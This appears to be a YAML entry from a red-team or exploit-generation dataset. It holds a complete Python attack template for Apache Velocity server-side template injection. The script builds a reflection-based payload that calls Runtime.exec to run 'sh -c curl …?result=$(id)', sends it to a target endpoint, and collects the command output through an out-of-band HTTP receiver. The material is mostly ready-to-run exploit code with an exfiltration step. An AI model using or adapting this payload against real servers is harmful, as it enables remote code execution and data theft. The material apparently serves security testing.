- name: seed-warmup-cwe-1336-template
  description: '预热生成的可执行攻击模板: Server-Side Template Injection (SSTI) via Apache Velocity
    leading to Remote Code Execution'
  lang: python
  template: "import urllib.parse\nimport redteam_sdk\nimport time\n\nTARGET_URL =\
    \ \"http://host.docker.internal:9443\"\n\ndef build_payload(oob_url: str) -> str:\n\
    \    \"\"\"\n    Construct a Velocity SSTI payload that executes 'id' and exfiltrates\
    \ the result\n    via an OOB HTTP request to the provided URL.\n    The payload\
    \ uses Java reflection to call Runtime.exec() with a command array\n    created\
    \ by splitting a comma-separated string.\n    \"\"\"\n    command = f\"curl {oob_url}/?result=$(id)\"\
    \n    # We use commas as separator to avoid conflicts with spaces inside the command\n\
    \    # split into [\"sh\", \"-c\", \"curl ...\"]\n    cmd_string = \"sh,-c,\"\
    \ + command\n    # Velocity template code\n    payload = (\n        '#set($cmdstr=\"\
    ' + cmd_string + '\")'\n        '#set($arr=$cmdstr.split(\",\"))'\n        '#set($rt=$class.forName(\"\
    java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null))'\n    \
    \    '#set($exec_m=$rt.getClass().getMethod(\"exec\",$arr.getClass()))'\n    \
    \    '$exec_m.invoke($rt,$arr)'\n    )\n    return payload\n\ndef main():\n  \
    \  # 1. Start OOB receiver\n    oob = redteam_sdk.OOBReceiver(port=8765)\n   \
    \ print(f\"[*] OOBReceiver listening on: {oob.url}\")\n\n    # 2. Prepare HTTP\
    \ client\n    client = redteam_sdk.HttpClient(base_url=TARGET_URL)\n\n    # 3.\
    \ Build payload with dynamic OOB URL\n    payload = build_payload(oob.url)\n \
    \   encoded_payload = urllib.parse.quote(payload)\n\n    # 4. Attack: send SSTI\
    \ payload via the 'text' parameter\n    #    The vulnerable endpoint is assumed\
    \ to be the root path \"/\"\n    attack_url = f\"/?text={encoded_payload}\"\n\
    \    print(f\"[*] Sending payload to {attack_url}...\")\n    try:\n        resp\
    \ = client.get(attack_url)\n        print(f\"[*] Response status: {resp.status_code}\"\
    )\n        # The response body might contain rendered template leftovers\n   \
    \     # print(resp.text[:500])  # optionally debug\n    except Exception as e:\n\
    \        print(f\"[-] HTTP request failed: {e}\")\n        # Even on failure we\
    \ don't stop, OOB might still work\n\n    # 5. Wait for the OOB callback (command\
    \ output)\n    print(\"[*] Waiting for OOB callback (max 10 seconds)...\")\n \
    \   data = None\n    try:\n        # Attempt to receive data. adjust method name\
    \ if needed.\n        # Assume redteam_sdk.OOBReceiver has a receive() method\
    \ returning request info.\n        # If not, we can poll or use wait_for_request().\n\
    \        raw_req = oob.wait_for_request(timeout=10)\n        if raw_req:\n   \
    \         # raw_req may contain request line and headers; extract 'result' parameter\n\
    \            # Simple extraction: look for \"GET /?result=\"\n            if \"\
    GET /?result=\" in raw_req:\n                start = raw_req.find(\"GET /?result=\"\
    ) + len(\"GET /?result=\")\n                end = raw_req.find(\" \", start)\n\
    \                data = urllib.parse.unquote(raw_req[start:end])\n           \
    \     print(f\"[+] Received command output: {data}\")\n            else:\n   \
    \             print(\"[!] Received OOB request but no 'result' parameter found.\"\
    )\n                print(raw_req)\n        else:\n            print(\"[-] No OOB\
    \ callback received within timeout.\")\n    except Exception as e:\n        print(f\"\
    [-] Error handling OOB: {e}\")\n\n    # 6. Cleanup and final status\n    # If\
    \ we couldn't get data, print it anyway.\n    if data:\n        print(f\"[+] Flag\
    \ / id output: {data}\")\n    else:\n        print(\"[!] No exfiltrated data captured.\"\
    )\n\n    print(\"STEP_OK\")\n\nif __name__ == \"__main__\":\n    main()"
